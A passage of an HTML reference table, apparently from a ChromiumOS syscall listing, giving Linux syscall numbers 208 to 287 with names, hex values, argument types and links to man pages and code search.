<td align="center"><a href="https://man7.org/linux/man-pages/man2/setsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsockopt">cs/</a></td>
<td align="center">0xd0</td>
<td>int fd</td>
<td>int level</td>
<td>int optname</td>
<td>char *optval</td>
<td>int optlen</td>
<td>-</td>
</tr>
<tr>
<td align="center">209</td>
<td>getsockopt</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockopt">cs/</a></td>
<td align="center">0xd1</td>
<td>int fd</td>
<td>int level</td>
<td>int optname</td>
<td>char *optval</td>
<td>int *optlen</td>
<td>-</td>
</tr>
<tr>
<td align="center">210</td>
<td>shutdown</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/shutdown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shutdown">cs/</a></td>
<td align="center">0xd2</td>
<td>int</td>
<td>int</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">211</td>
<td>sendmsg</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmsg">cs/</a></td>
<td align="center">0xd3</td>
<td>int fd</td>
<td>struct user_msghdr *msg</td>
<td>unsigned flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">212</td>
<td>recvmsg</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmsg">cs/</a></td>
<td align="center">0xd4</td>
<td>int fd</td>
<td>struct user_msghdr *msg</td>
<td>unsigned flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">213</td>
<td>readahead</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/readahead.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readahead">cs/</a></td>
<td align="center">0xd5</td>
<td>int fd</td>
<td>loff_t offset</td>
<td>size_t count</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">214</td>
<td>brk</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/brk.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*brk">cs/</a></td>
<td align="center">0xd6</td>
<td>unsigned long brk</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">215</td>
<td>munmap</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/munmap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munmap">cs/</a></td>
<td align="center">0xd7</td>
<td>unsigned long addr</td>
<td>size_t len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">216</td>
<td>mremap</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mremap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mremap">cs/</a></td>
<td align="center">0xd8</td>
<td>unsigned long addr</td>
<td>unsigned long old_len</td>
<td>unsigned long new_len</td>
<td>unsigned long flags</td>
<td>unsigned long new_addr</td>
<td>-</td>
</tr>
<tr>
<td align="center">217</td>
<td>add_key</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/add_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*add_key">cs/</a></td>
<td align="center">0xd9</td>
<td>const char *_type</td>
<td>const char *_description</td>
<td>const void *_payload</td>
<td>size_t plen</td>
<td>key_serial_t destringid</td>
<td>-</td>
</tr>
<tr>
<td align="center">218</td>
<td>request_key</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/request_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*request_key">cs/</a></td>
<td align="center">0xda</td>
<td>const char *_type</td>
<td>const char *_description</td>
<td>const char *_callout_info</td>
<td>key_serial_t destringid</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">219</td>
<td>keyctl</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/keyctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*keyctl">cs/</a></td>
<td align="center">0xdb</td>
<td>int cmd</td>
<td>unsigned long arg2</td>
<td>unsigned long arg3</td>
<td>unsigned long arg4</td>
<td>unsigned long arg5</td>
<td>-</td>
</tr>
<tr>
<td align="center">220</td>
<td>clone</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/clone.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clone">cs/</a></td>
<td align="center">0xdc</td>
<td>unsigned long</td>
<td>unsigned long</td>
<td>int *</td>
<td>int *</td>
<td>unsigned long</td>
<td>-</td>
</tr>
<tr>
<td align="center">221</td>
<td>execve</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/execve.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execve">cs/</a></td>
<td align="center">0xdd</td>
<td>const char *filename</td>
<td>const char *const *argv</td>
<td>const char *const *envp</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">222</td>
<td>mmap</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mmap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mmap">cs/</a></td>
<td align="center">0xde</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
<td>?</td>
</tr>
<tr>
<td align="center">223</td>
<td>fadvise64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fadvise64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fadvise64">cs/</a></td>
<td align="center">0xdf</td>
<td>int fd</td>
<td>loff_t offset</td>
<td>size_t len</td>
<td>int advice</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">224</td>
<td>swapon</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/swapon.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapon">cs/</a></td>
<td align="center">0xe0</td>
<td>const char *specialfile</td>
<td>int swap_flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">225</td>
<td>swapoff</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/swapoff.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*swapoff">cs/</a></td>
<td align="center">0xe1</td>
<td>const char *specialfile</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">226</td>
<td>mprotect</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mprotect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mprotect">cs/</a></td>
<td align="center">0xe2</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>unsigned long prot</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">227</td>
<td>msync</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/msync.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msync">cs/</a></td>
<td align="center">0xe3</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">228</td>
<td>mlock</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock">cs/</a></td>
<td align="center">0xe4</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">229</td>
<td>munlock</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/munlock.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlock">cs/</a></td>
<td align="center">0xe5</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">230</td>
<td>mlockall</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlockall">cs/</a></td>
<td align="center">0xe6</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">231</td>
<td>munlockall</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/munlockall.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munlockall">cs/</a></td>
<td align="center">0xe7</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">232</td>
<td>mincore</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mincore.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mincore">cs/</a></td>
<td align="center">0xe8</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>unsigned char * vec</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">233</td>
<td>madvise</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/madvise.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*madvise">cs/</a></td>
<td align="center">0xe9</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>int behavior</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">234</td>
<td>remap_file_pages</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/remap_file_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*remap_file_pages">cs/</a></td>
<td align="center">0xea</td>
<td>unsigned long start</td>
<td>unsigned long size</td>
<td>unsigned long prot</td>
<td>unsigned long pgoff</td>
<td>unsigned long flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">235</td>
<td>mbind</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mbind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mbind">cs/</a></td>
<td align="center">0xeb</td>
<td>unsigned long start</td>
<td>unsigned long len</td>
<td>unsigned long mode</td>
<td>const unsigned long *nmask</td>
<td>unsigned long maxnode</td>
<td>unsigned flags</td>
</tr>
<tr>
<td align="center">236</td>
<td>get_mempolicy</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/get_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_mempolicy">cs/</a></td>
<td align="center">0xec</td>
<td>int *policy</td>
<td>unsigned long *nmask</td>
<td>unsigned long maxnode</td>
<td>unsigned long addr</td>
<td>unsigned long flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">237</td>
<td>set_mempolicy</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/set_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_mempolicy">cs/</a></td>
<td align="center">0xed</td>
<td>int mode</td>
<td>const unsigned long *nmask</td>
<td>unsigned long maxnode</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">238</td>
<td>migrate_pages</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/migrate_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*migrate_pages">cs/</a></td>
<td align="center">0xee</td>
<td>pid_t pid</td>
<td>unsigned long maxnode</td>
<td>const unsigned long *from</td>
<td>const unsigned long *to</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">239</td>
<td>move_pages</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/move_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*move_pages">cs/</a></td>
<td align="center">0xef</td>
<td>pid_t pid</td>
<td>unsigned long nr_pages</td>
<td>const void * *pages</td>
<td>const int *nodes</td>
<td>int *status</td>
<td>int flags</td>
</tr>
<tr>
<td align="center">240</td>
<td>rt_tgsigqueueinfo</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/rt_tgsigqueueinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*rt_tgsigqueueinfo">cs/</a></td>
<td align="center">0xf0</td>
<td>pid_t tgid</td>
<td>pid_t pid</td>
<td>int sig</td>
<td>siginfo_t *uinfo</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">241</td>
<td>perf_event_open</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/perf_event_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*perf_event_open">cs/</a></td>
<td align="center">0xf1</td>
<td>struct perf_event_attr *attr_uptr</td>
<td>pid_t pid</td>
<td>int cpu</td>
<td>int group_fd</td>
<td>unsigned long flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">242</td>
<td>accept4</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/accept4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept4">cs/</a></td>
<td align="center">0xf2</td>
<td>int</td>
<td>struct sockaddr *</td>
<td>int *</td>
<td>int</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">243</td>
<td>recvmmsg</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmmsg">cs/</a></td>
<td align="center">0xf3</td>
<td>int fd</td>
<td>struct mmsghdr *msg</td>
<td>unsigned int vlen</td>
<td>unsigned flags</td>
<td>struct __kernel_timespec *timeout</td>
<td>-</td>
</tr>
<tr>
<td align="center">244</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xf4</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">245</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xf5</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">246</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xf6</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">247</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xf7</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">248</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xf8</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">249</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xf9</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">250</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xfa</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">251</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xfb</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">252</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xfc</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">253</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xfd</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">254</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xfe</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">255</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0xff</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">256</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x100</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">257</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x101</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">258</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x102</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">259</td>
<td><em>not implemented</em></td>
<td align="center"></td>
<td align="center">0x103</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td align="center">260</td>
<td>wait4</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/wait4.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*wait4">cs/</a></td>
<td align="center">0x104</td>
<td>pid_t pid</td>
<td>int *stat_addr</td>
<td>int options</td>
<td>struct rusage *ru</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">261</td>
<td>prlimit64</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/prlimit64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prlimit64">cs/</a></td>
<td align="center">0x105</td>
<td>pid_t pid</td>
<td>unsigned int resource</td>
<td>const struct rlimit64 *new_rlim</td>
<td>struct rlimit64 *old_rlim</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">262</td>
<td>fanotify_init</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_init.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_init">cs/</a></td>
<td align="center">0x106</td>
<td>unsigned int flags</td>
<td>unsigned int event_f_flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">263</td>
<td>fanotify_mark</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/fanotify_mark.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fanotify_mark">cs/</a></td>
<td align="center">0x107</td>
<td>int fanotify_fd</td>
<td>unsigned int flags</td>
<td>u64 mask</td>
<td>int fd</td>
<td>const char *pathname</td>
<td>-</td>
</tr>
<tr>
<td align="center">264</td>
<td>name_to_handle_at</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/name_to_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*name_to_handle_at">cs/</a></td>
<td align="center">0x108</td>
<td>int dfd</td>
<td>const char *name</td>
<td>struct file_handle *handle</td>
<td>int *mnt_id</td>
<td>int flag</td>
<td>-</td>
</tr>
<tr>
<td align="center">265</td>
<td>open_by_handle_at</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*open_by_handle_at">cs/</a></td>
<td align="center">0x109</td>
<td>int mountdirfd</td>
<td>struct file_handle *handle</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">266</td>
<td>clock_adjtime</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_adjtime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_adjtime">cs/</a></td>
<td align="center">0x10a</td>
<td>clockid_t which_clock</td>
<td>struct __kernel_timex *tx</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">267</td>
<td>syncfs</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/syncfs.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*syncfs">cs/</a></td>
<td align="center">0x10b</td>
<td>int fd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">268</td>
<td>setns</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/setns.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setns">cs/</a></td>
<td align="center">0x10c</td>
<td>int fd</td>
<td>int nstype</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">269</td>
<td>sendmmsg</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmmsg">cs/</a></td>
<td align="center">0x10d</td>
<td>int fd</td>
<td>struct mmsghdr *msg</td>
<td>unsigned int vlen</td>
<td>unsigned flags</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">270</td>
<td>process_vm_readv</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_readv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_readv">cs/</a></td>
<td align="center">0x10e</td>
<td>pid_t pid</td>
<td>const struct iovec *lvec</td>
<td>unsigned long liovcnt</td>
<td>const struct iovec *rvec</td>
<td>unsigned long riovcnt</td>
<td>unsigned long flags</td>
</tr>
<tr>
<td align="center">271</td>
<td>process_vm_writev</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/process_vm_writev.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*process_vm_writev">cs/</a></td>
<td align="center">0x10f</td>
<td>pid_t pid</td>
<td>const struct iovec *lvec</td>
<td>unsigned long liovcnt</td>
<td>const struct iovec *rvec</td>
<td>unsigned long riovcnt</td>
<td>unsigned long flags</td>
</tr>
<tr>
<td align="center">272</td>
<td>kcmp</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/kcmp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kcmp">cs/</a></td>
<td align="center">0x110</td>
<td>pid_t pid1</td>
<td>pid_t pid2</td>
<td>int type</td>
<td>unsigned long idx1</td>
<td>unsigned long idx2</td>
<td>-</td>
</tr>
<tr>
<td align="center">273</td>
<td>finit_module</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/finit_module.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*finit_module">cs/</a></td>
<td align="center">0x111</td>
<td>int fd</td>
<td>const char *uargs</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">274</td>
<td>sched_setattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setattr">cs/</a></td>
<td align="center">0x112</td>
<td>pid_t pid</td>
<td>struct sched_attr *attr</td>
<td>unsigned int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">275</td>
<td>sched_getattr</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getattr">cs/</a></td>
<td align="center">0x113</td>
<td>pid_t pid</td>
<td>struct sched_attr *attr</td>
<td>unsigned int size</td>
<td>unsigned int flags</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">276</td>
<td>renameat2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat2">cs/</a></td>
<td align="center">0x114</td>
<td>int olddfd</td>
<td>const char *oldname</td>
<td>int newdfd</td>
<td>const char *newname</td>
<td>unsigned int flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">277</td>
<td>seccomp</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/seccomp.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*seccomp">cs/</a></td>
<td align="center">0x115</td>
<td>unsigned int op</td>
<td>unsigned int flags</td>
<td>void *uargs</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">278</td>
<td>getrandom</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/getrandom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrandom">cs/</a></td>
<td align="center">0x116</td>
<td>char *buf</td>
<td>size_t count</td>
<td>unsigned int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">279</td>
<td>memfd_create</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/memfd_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*memfd_create">cs/</a></td>
<td align="center">0x117</td>
<td>const char *uname_ptr</td>
<td>unsigned int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">280</td>
<td>bpf</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/bpf.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bpf">cs/</a></td>
<td align="center">0x118</td>
<td>int cmd</td>
<td>union bpf_attr *attr</td>
<td>unsigned int size</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">281</td>
<td>execveat</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/execveat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execveat">cs/</a></td>
<td align="center">0x119</td>
<td>int dfd</td>
<td>const char *filename</td>
<td>const char *const *argv</td>
<td>const char *const *envp</td>
<td>int flags</td>
<td>-</td>
</tr>
<tr>
<td align="center">282</td>
<td>userfaultfd</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/userfaultfd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*userfaultfd">cs/</a></td>
<td align="center">0x11a</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">283</td>
<td>membarrier</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/membarrier.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*membarrier">cs/</a></td>
<td align="center">0x11b</td>
<td>int cmd</td>
<td>unsigned int flags</td>
<td>int cpu_id</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">284</td>
<td>mlock2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/mlock2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mlock2">cs/</a></td>
<td align="center">0x11c</td>
<td>unsigned long start</td>
<td>size_t len</td>
<td>int flags</td>
<td>-</td>
<td>-</td>
<td>-</td>
</tr>
<tr>
<td align="center">285</td>
<td>copy_file_range</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/copy_file_range.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*copy_file_range">cs/</a></td>
<td align="center">0x11d</td>
<td>int fd_in</td>
<td>loff_t *off_in</td>
<td>int fd_out</td>
<td>loff_t *off_out</td>
<td>size_t len</td>
<td>unsigned int flags</td>
</tr>
<tr>
<td align="center">286</td>
<td>preadv2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/preadv2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*preadv2">cs/</a></td>
<td align="center">0x11e</td>
<td>unsigned long fd</td>
<td>const struct iovec *vec</td>
<td>unsigned long vlen</td>
<td>unsigned long pos_l</td>
<td>unsigned long pos_h</td>
<td>rwf_t flags</td>
</tr>
<tr>
<td align="center">287</td>
<td>pwritev2</td>
<td align="center"><a href="https://man7.org/linux/man-pages/man2/pwritev2.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pwritev2">cs/</a></td>
<td align="center">0x11f</td>
<td>unsigned long fd</td>
<td>const struct iovec *vec</td>
<td>unsigned long vlen</td>
<td>unsigned long pos_l</td>
<td>unsigned long pos_h</td>
